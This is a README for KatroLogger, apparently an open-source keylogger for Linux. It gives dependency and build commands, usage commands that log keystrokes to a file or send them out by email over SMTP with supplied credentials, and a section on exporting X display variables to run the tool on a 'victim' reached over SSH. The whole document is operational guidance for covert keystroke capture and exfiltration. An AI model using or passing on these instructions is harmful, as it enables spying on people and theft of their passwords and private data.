# KatroLogger
KeyLogger for Linux Systems.

- **Features**
  - Runs on GUI systems or CLI
  - Sending data by email

- **Dependencies**
- [Xlib](https://www.x.org/wiki/)
>X Window System protocol client library
```Shell:
# Debian-based:
apt install -y libx11-dev

# RPM-Based:
dnf install -y libX11-devel 
```
- [libquickmail](https://sourceforge.net/projects/libquickmail/)
```
wget https://ufpr.dl.sourceforge.net/project/libquickmail/libquickmail-0.1.29.tar.xz
tar -xvf libquickmail-0.1.29.tar.xz
./autogen.sh && ./configure && make && make install
```

- **Compiling**
```Shell
./configure
make
make install
```
- **Usage**
```Shell
katrologger --output /path/file
```
- Send data by e-mail
```Shell
katrologger --smtps-url smtp.gmail.com --port 465 --mail-from <address> --mail-rcpt <address> --pass <password> --smtp-file /path/keyscan --time 10
```
- **Fixing problems accessing via SSH**
> when connecting to the victim remotely via ssh it will be necessary to export environment variables to run the keylogger.

For hosts with xorg running:
> identifying logged in user
```Shell
user=$(who | grep "(:0)" | awk '{print $1}')
echo $user
```
> Exporting variables
```Shell
export DISPLAY=:0.0
export XAUTHORITY=/home/$user/.Xauthority
```
- **Uninstall**
```Shell
make uninstall
```
